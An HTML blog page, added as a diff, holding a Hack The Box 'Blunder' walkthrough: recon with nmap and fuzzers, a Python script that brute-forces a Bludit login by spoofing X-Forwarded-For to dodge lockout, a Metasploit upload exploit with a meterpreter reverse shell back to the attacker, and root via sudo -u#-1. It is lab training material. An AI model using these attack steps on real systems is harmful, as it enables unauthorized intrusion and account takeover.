@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Blunder"/>
+<meta name="twitter:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.191  Mind Map Reconnaisance Initial scan:
+sudo nmap -sC -sV -n 10.10.10.191 -oA nmap/initial Nmap scan report for 10.10.10.191 Host is up (0.077s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Only port 80 is open."/>
+
+    <meta property="og:title" content="Blunder" />
+<meta property="og:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.191  Mind Map Reconnaisance Initial scan:
+sudo nmap -sC -sV -n 10.10.10.191 -oA nmap/initial Nmap scan report for 10.10.10.191 Host is up (0.077s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Only port 80 is open." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/blunder/" />
+<meta property="article:published_time" content="2020-07-04T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-07-04T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/blunder/">
+    
+    <title>
+  Blunder · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/blunder/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Blunder</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-07-04T16:04:02&#43;01:00'>
+                July 4, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              6-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Linux</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.191</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/blunder_mindmap.png" alt="Blunder_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>Initial scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -sC -sV -n 10.10.10.191 -oA nmap/initial
+
+Nmap scan report for 10.10.10.191
+Host is up (0.077s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts</code></pre></div>
+<p>Only <strong>port 80</strong> is open. Visiting the page I can see that it is a simple blog. With  a combination of the <code>WhatWeb</code>command and a qiuck look at the page source code I&rsquo;m able to identify the blog service name and its version:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">whatweb http://10.10.10.191
+http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]</code></pre></div>
+<p><strong>Note:</strong></p>
+<blockquote>
+<p>WhatWeb identifies websites. Its goal is to answer the question, “What is that Website?”. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.</p>
+</blockquote>
+<p>Source code:</p>
+<p><img src="/images/htb/bludit_version.png" alt="Bludit_Version"></p>
+<p><strong>-&gt;</strong> So I can conclude that the CMS in use is <strong>Bludit version 3.9.2</strong>.</p>
+<p>This particular version is vulnerable to <strong>CVE-2019-16113</strong> and allows remote code execution via <code>bl-kernel/ajax/upload-images.ph</code> and PHP code can be entered with a <code>.jpg</code> file name. But for the moment, I&rsquo;m not able to upload any file as I don&rsquo;t have an access point to the app!</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>At this point I proceed enumerating port 80 and searching for some configuration files left available or some directories/files.
+For this task I&rsquo;m using <code>dirsearch</code> and <code>wfuzz</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r -f -e php,sh,old,bak
+
+ _|. _ _  _  _  _ _|_    v0.3.9
+(_||| _) (/_(_|| (_| )
+
+Extensions: php.sh, old, bak, js, asp, aspx | HTTP method: get | Threads: 10 | Wordlist size: 613521 | Recursion level: 1
+
+Error Log: /opt/dirsearch/logs/errors-20-07-05_10-33-25.log
+
+Target: http://10.10.10.191
+
+[10:33:25] Starting:
+[10:33:46] 403 -  277B  - /icons/         
+[10:34:38] 200 -    2KB - /admin/  
+.....          </code></pre></div>
+<p>I discovered a login page under <code>/admin</code>:</p>
+<p><img src="/images/htb/bludit_login_page.png" alt="Bludit_LoginPage"></p>
+<p><strong>Note</strong>: I will not try to bruteforce the login before having a valid username because the <code>Bludit</code> service webpage states clearly that there is a system blocking login brute force attempts.</p>
+<p>With <code>wfuzz</code> I&rsquo;m searching for some configuration or text files left available by the developers:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">wfuzz -c -w /opt/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u &#34;http://10.10.10.191/FUZZ.txt&#34; -t 100
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ.txt
+Total requests: 4655
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                      
+===================================================================
+
+000003516:   200        1 L      4 W      22 Ch       &#34;robots&#34;                                                                                                     
+000004122:   200        4 L      23 W     118 Ch      &#34;todo&#34;                                                                                                       
+
+Total time: 130.1939
+Processed Requests: 4655
+Filtered Requests: 4653                                                                                                                                                       
+Requests/sec.: 35.75433  </code></pre></div>
+<p>Where:</p>
+<ul>
+<li><code>-c</code> renders the output with colors</li>
+<li><code>-w</code> specifies the wordlist</li>
+<li><code>--hc</code> hide the responses with the specified code, <code>403</code> and <code>404</code> in this case</li>
+<li><code>-u</code> is the url to fuzz</li>
+<li><code>-t</code> specifies the number of concurrent connections</li>
+</ul>
+<p>Let&rsquo;s visit <code>/todo.txt</code>:</p>
+<p><img src="/images/htb/bludit_todo.png" alt="Bludit_ToDo"></p>
+<p><strong>Note</strong>: <strong>fergus</strong> could be a valid username for the login page!</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>At this point, doing some research on the service, I know that there is a method to bypass the brute force security service.
+Reference -&gt; <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a></p>
+<p>I edit the code a bit to fit my purpose:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.10.191&#39;</span>
+login_url <span style="color:#f92672">=</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/admin/login&#39;</span>
+username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fergus&#39;</span>
+pass_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/home/user/Desktop/HackTheBox/Blunder/pass_file.txt&#34;</span>
+
+<span style="color:#66d9ef">with</span> open(pass_file) <span style="color:#66d9ef">as</span> w:
+    content <span style="color:#f92672">=</span> w<span style="color:#f92672">.</span>readlines()
+    result <span style="color:#f92672">=</span> [x<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> content]
+wordlist <span style="color:#f92672">=</span> result
+
+
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> wordlist:
+    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+    login_page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(login_url)
+    csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>, login_page<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] Trying: {p}&#39;</span><span style="color:#f92672">.</span>format(p <span style="color:#f92672">=</span> password))
+
+    headers <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: password,
+        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,
+        <span style="color:#e6db74">&#39;Referer&#39;</span>: login_url
+    }
+
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;tokenCSRF&#39;</span>: csrf_token,
+        <span style="color:#e6db74">&#39;username&#39;</span>: username,
+        <span style="color:#e6db74">&#39;password&#39;</span>: password,
+        <span style="color:#e6db74">&#39;save&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>
+    }
+
+    login_result <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(login_url, headers <span style="color:#f92672">=</span> headers, data <span style="color:#f92672">=</span> data, allow_redirects <span style="color:#f92672">=</span> False)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/admin/dashboard&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]:
+            <span style="color:#66d9ef">print</span>()
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;SUCCESS: Password found!&#39;</span>)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Use {u}:{p} to login.&#39;</span><span style="color:#f92672">.</span>format(u <span style="color:#f92672">=</span> username, p <span style="color:#f92672">=</span> password))
+            <span style="color:#66d9ef">print</span>()
+            <span style="color:#66d9ef">break</span></code></pre></div>
+<p>Where the <code>pass_file</code> is a wordlist obtained with <code>cewl</code>:</p>
+<blockquote>
+<p>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><code>-w</code> is the output file where to write</li>
+<li><code>-d</code> is the spider depth</li>
+<li><code>-m</code> is the minimum word length</li>
+</ul>
+<p>Launching the script I&rsquo;m able to find a valid password for the <code>fergus</code> user!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">python3 bruteforce.py
+...
+...
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.</code></pre></div>
+<p>As stated before, this version of Bludit is vulnerable to a <code>Directory Traversal Image File Upload Vulnerability</code>, for which there is a Metasploit module available!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show options
+
+Module options (exploit/linux/http/bludit_upload_images_exec):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   BLUDITPASS  RolandDeschain   yes       The password for Bludit
+   BLUDITUSER  fergus           yes       The username for Bludit
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;<span style="color:#f92672">path</span>&gt;&#39;
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The base path for Bludit
+   VHOST                        no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Bludit v3.9.2</code></pre></div>
+<p>After running the exploit, I&rsquo;m able to get a shell as the <code>www-data</code> user!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">meterpreter &gt; getuid
+Server username: www-data (33)</code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Let&rsquo;s spawn a python shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">meterpreter &gt; shell
+Process 3656 created.
+Channel 0 created.
+python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$</code></pre></div>
+<p>Visiting the home page under <code>/home</code> I can see that there are home folders for two users, <code>hugo</code> and <code>shaun</code>.</p>
+<p><strong>-&gt;</strong> I&rsquo;m able to find the password for the <code>hugo</code> user under:</p>
+<p><code>/var/www/bludit-3.10.0a/bl-content/databases/users.php</code>.</p>
+<p><strong>Note</strong>: I can switch to user <code>hugo</code> with the <code>su hugo</code> command!</p>
+<p>Can I run any command with  root privileges with that user?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">ugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash</code></pre></div>
+<p>The answer is yes, any command except for <code>/bin/bash</code>!</p>
+<p>This kind of configuration of the sudoers file is known to be vulnerable to <strong>CVE : 2019-14287</strong></p>
+<p>All I need to do to obtain root here is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
+
+root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)</code></pre></div>
+<p><strong>Note</strong>: flags are under <code>/home/hugo</code> and <code>/root</code>!</p>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>The blog was not patched against the public known vulnerability for <strong>Bludit version 3.9.2</strong>. The administrator should have upgraded the service to a more secure version.</li>
+<li>Thanks to the <code>todo.txt</code> file left on the server by the developers I was able to retrieve a valid user and bruteforce the login. This should not happen and all the sensible configuration files and notes should be stored in a safe place.</li>
+<li>There are always different ways to do things. Tools are here for our advantage but it is really important to understand what we&rsquo;re doing before launching random attacks. In this case <code>dirsearch</code> and <code>wfuzz</code> were both indispensable to find our way in, but I could have found the same results using only one of them. Also, <code>cewl</code> was very useful because the login password was not present in the common wordlists I&rsquo;m using.</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
